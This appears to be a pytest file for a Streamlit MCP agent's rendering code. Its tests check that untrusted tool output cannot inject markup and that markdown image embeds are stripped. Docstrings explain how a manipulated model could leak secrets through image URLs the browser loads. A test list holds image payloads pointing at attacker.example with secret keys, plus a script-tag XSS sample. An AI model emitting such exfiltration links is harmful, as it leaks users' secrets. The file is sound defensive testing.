"""What each streamed event is drawn with, and where.

Split out of `app.py` because nothing could reach it there. The turn ends in
`st.rerun()` and the page is rebuilt by `render_history`, so a mutation pass
found every branch of `draw` free: text could be routed into the tool pane,
the kind check could be removed entirely, and tool output could be sent
through `st.markdown` — all with 187 tests green, the last of those being the
injection this code exists to prevent.
"""

from __future__ import annotations

from contextlib import contextmanager

import pytest

from mcp_agent.rendering import draw
from mcp_agent.turns import TurnEvent


class FakeStreamlit:
    """Just enough `st` to see which call the tool payload went through."""

    def __init__(self) -> None:
        self.code: list[tuple[str, str | None]] = []
        self.markdown: list[str] = []

    def code_call(self, body: str, language: str | None = None) -> None:
        self.code.append((body, language))

    def markdown_call(self, body: str) -> None:
        self.markdown.append(body)


@pytest.fixture
def fake_st(monkeypatch):
    fake = FakeStreamlit()

    class Shim:
        code = staticmethod(fake.code_call)
        markdown = staticmethod(fake.markdown_call)

    monkeypatch.setattr("mcp_agent.rendering.st", Shim)
    return fake


class Pane:
    """A placeholder that records `markdown` and hands itself to `expander`."""

    def __init__(self) -> None:
        self.markdown_calls: list[str] = []
        self.expanders: list[str] = []

    def markdown(self, body: str) -> None:
        self.markdown_calls.append(body)

    @contextmanager
    def expander(self, label: str, expanded: bool = False):
        self.expanders.append(label)
        yield self


def test_text_goes_to_the_text_pane_and_only_there(fake_st):
    text, tools = Pane(), Pane()

    draw(TurnEvent("text", "Half past four."), text, tools)

    assert text.markdown_calls == ["Half past four."]
    assert tools.markdown_calls == []
    assert tools.expanders == []


def test_the_answer_is_actually_drawn(fake_st):
    """Gutting this branch is invisible to every test that drives the script."""
    text, tools = Pane(), Pane()

    draw(TurnEvent("text", "Hello world."), text, tools)

    assert text.markdown_calls == ["Hello world."]


def test_tool_output_goes_through_st_code_never_markdown(fake_st):
    """The injection this routing exists to stop.

    Tool output is untrusted. Through `st.markdown` a literal fence in it
    escapes into live markdown on the page; through `st.code` it cannot.
    """
    text, tools = Pane(), Pane()
    payload = "```\n<script>alert(1)</script>\n```"

    draw(TurnEvent("tool", payload), text, tools)

    assert fake_st.code == [(payload, "json")]
    assert fake_st.markdown == []
    assert text.markdown_calls == []


def test_tool_output_is_drawn_inside_the_tool_pane(fake_st):
    text, tools = Pane(), Pane()

    draw(TurnEvent("tool", "{}"), text, tools)

    assert tools.expanders == ["🔧 Tool Call Information"]
    assert text.markdown_calls == []


def test_the_two_kinds_are_told_apart(fake_st):
    """Dropping the check sends tool output to the text pane as markdown."""
    text, tools = Pane(), Pane()

    draw(TurnEvent("text", "answer"), text, tools)
    draw(TurnEvent("tool", "tool output"), text, tools)

    assert text.markdown_calls == ["answer"]
    assert fake_st.code == [("tool output", "json")]


# --- The other half of the exfiltration path ------------------------------------


def test_an_image_embed_in_an_answer_is_defused():
    """A sandbox with no network does not stop the browser fetching.

    Streamlit renders markdown image syntax as an `<img>`, which the viewer's
    browser loads with no click. So a model talked into writing
    `![](https://attacker/?k=SECRET)` has a way out that the container's
    missing network does nothing about — the request leaves the browser. A
    security review found this while `shell.py` asserted the path was shut.
    """
    from mcp_agent.rendering import without_images

    assert "attacker" not in without_images("![](https://attacker.example/?k=sk-ant-secret)")


def test_the_alt_text_survives_so_the_answer_still_reads():
    from mcp_agent.rendering import without_images

    assert without_images("Here: ![the chart](x.png)") == "Here: [image: the chart]"


def test_links_are_left_alone():
    """They need a click. Stripping them would cost the model its citations."""
    from mcp_agent.rendering import without_images

    text = "See [the docs](https://example.com/page) for more."
    assert without_images(text) == text


def test_a_reference_style_image_is_defused_too():
    """`![alt][id]` renders as an `<img>` just as `![alt](url)` does.

    The first pass matched only the inline form, so a reply carrying
    `![a][x]` plus an `[x]: https://attacker/?k=...` definition kept the whole
    egress route open while the module docstring said it was shut. A docs
    review caught the gap between the two.
    """
    from mcp_agent.rendering import without_images

    assert without_images("![a][ref]") == "[image: a]"
    assert without_images("![][ref]") == "[image]"


#: Every CommonMark shape that renders an `<img>`, each carrying the same
#: attacker host so one assertion covers all of them. The first three were
#: found open by a pre-release security review *after* the reference form had
#: already been fixed — the regex could not express a link label, which admits
#: backslash escapes and balanced brackets, so each fix closed one spelling and
#: left the others. That is why `rendering.py` scans instead of matching.
IMAGE_SHAPES = [
    "![a](https://attacker.example/?k=SECRET)",  # inline
    "![a][ref]",  # full reference
    "![a][]",  # collapsed reference
    "![a]",  # shortcut reference
    r"![a\]b](https://attacker.example/?k=SECRET)",  # escaped bracket in label
    r"![\]](https://attacker.example/?k=SECRET)",  # label that is only an escape
    "![[x]](https://attacker.example/?k=SECRET)",  # nested brackets in label
    "![a](https://attacker.example/?k=SECRET 'title')",  # inline with a title
    "![a](<https://attacker.example/?k=SECRET>)",  # pointy-bracket destination
]


@pytest.mark.parametrize("shape", IMAGE_SHAPES)
def test_no_image_shape_survives_with_its_destination(shape):
    """The exfiltration URL must not come through in any spelling.

    One assertion over every shape, because the failure mode here has been a
    fix that closed the shape in front of it and left the neighbours open.
    """
    from mcp_agent.rendering import without_images

    out = without_images(shape)
    assert "attacker.example" not in out, out
    assert "SECRET" not in out, out
    assert "![" not in out, out


@pytest.mark.parametrize("shape", IMAGE_SHAPES)
def test_every_image_shape_still_reads_as_an_image(shape):
    """Defusing must leave a legible trace, not a hole in the sentence."""
    from mcp_agent.rendering import without_images

    assert without_images(shape).startswith("[image")


def test_a_shortcut_reference_is_defused_even_though_it_looks_like_prose():
    """`![a]` with a definition anywhere in the message renders an `<img>`.

    Over-matching is the safe direction: literal `![not real]` becoming
    `[image: not real]` costs a cosmetic change to a rare string, while
    under-matching costs the whole egress claim.
    """
    from mcp_agent.rendering import without_images

    assert without_images("![a]\n\n[a]: https://attacker.example/?k=S") == (
        "[image: a]\n\n[a]: https://attacker.example/?k=S"
    )


def test_an_escaped_bang_is_a_link_and_is_left_alone():
    """`\\![a](url)` is a literal `!` followed by an ordinary link.

    Defusing it would strip a citation the model is entitled to make, which is
    the cost this function exists to avoid paying.
    """
    from mcp_agent.rendering import without_images

    text = r"\![a](https://example.com/page)"
    assert without_images(text) == text


def test_an_unclosed_label_is_left_as_text():
    """`![` with no `]` is not an image and must not eat the rest of the line."""
    from mcp_agent.rendering import without_images

    text = "![unclosed (https://example.com/page) and more text"
    assert without_images(text) == text


def test_every_image_on_a_line_is_defused():
    from mcp_agent.rendering import without_images

    assert without_images("![a](1)![b](2)") == "[image: a][image: b]"


def test_streamed_text_goes_through_the_same_filter(fake_st):
    """The streaming path and the replay path both render model output."""
    text, tools = Pane(), Pane()

    draw(TurnEvent("text", "![](https://attacker.example/?k=leak)"), text, tools)

    assert text.markdown_calls == ["[image]"]
